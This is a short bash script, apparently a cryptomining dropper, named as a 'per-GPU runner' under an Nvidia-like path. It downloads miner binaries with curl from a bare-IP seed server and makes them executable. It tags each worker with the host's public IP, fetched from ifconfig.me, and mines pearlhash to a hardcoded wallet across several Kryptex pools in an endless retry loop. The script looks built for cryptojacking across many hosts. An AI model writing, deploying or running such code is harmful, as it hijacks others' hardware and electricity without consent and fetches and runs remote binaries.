#!/bin/bash
# per-GPU runner v2 (i70783) - /opt/nv/run-g.sh
N="$1"
D=/opt/nv
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
SEED='http://163.68.86.6:8090'
POOLS="stratum+ssl://prl-sg.kryptex.network:8048 stratum+tcp://prl-sg.kryptex.network:7048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-ae.kryptex.network:8048"
mkdir -p "$D/logs" "$D/run"
exec 8>"$D/run/g$N.lock"
flock -n 8 || exit 0
ensure() { f="$1"; min="$2"; if [ ! -f "$f" ] || [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -lt "$min" ]; then curl -sf -m 300 "$SEED/$(basename "$f")" -o "$f.tmp" && chmod 755 "$f.tmp" && mv -f "$f.tmp" "$f"; fi; }
FIP=$(cat "$D/fip" 2>/dev/null)
case "$FIP" in *[0-9].[0-9]*) ;; *) FIP=$(curl -s -m 8 http://ifconfig.me 2>/dev/null); echo "$FIP" > "$D/fip";; esac
FIPD=$(echo "$FIP" | tr '.' '-')
WRK="ul-t19-$FIPD-g$N"
DEV=$(nvidia-smi --query-gpu=name --format=csv,noheader -i "$N" 2>/dev/null | head -1)
echo "[$(date -u +%FT%TZ)] run-g $N dev=$DEV fip=$FIP wrk=$WRK" >> "$D/logs/run.log"
if echo "$DEV" | grep -Eiq 'V100|P100|P40|P4|P6|T4|Quadro'; then
  ensure "$D/srb" 20000000
  while true; do
    for P in $POOLS; do
      echo "[$(date -u +%FT%TZ)] srb try $P $WRK" >> "$D/logs/run.log"
      timeout 300 "$D/srb" --algorithm pearlhash --pool "$P" --wallet "$W.$WRK" --password x \
        --disable-cpu --gpu-id "$N" --log-file "$D/logs/g$N.log" >> "$D/logs/g$N.out" 2>&1
      sleep 5
    done
  done
else
  ensure "$D/peakminer" 40000000
  exec "$D/peakminer" -d "$N" \
    -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 \
    -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 \
    -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 \
    -u "$W.$WRK" -p x -c pearl >> "$D/logs/g$N.log" 2>&1
fi
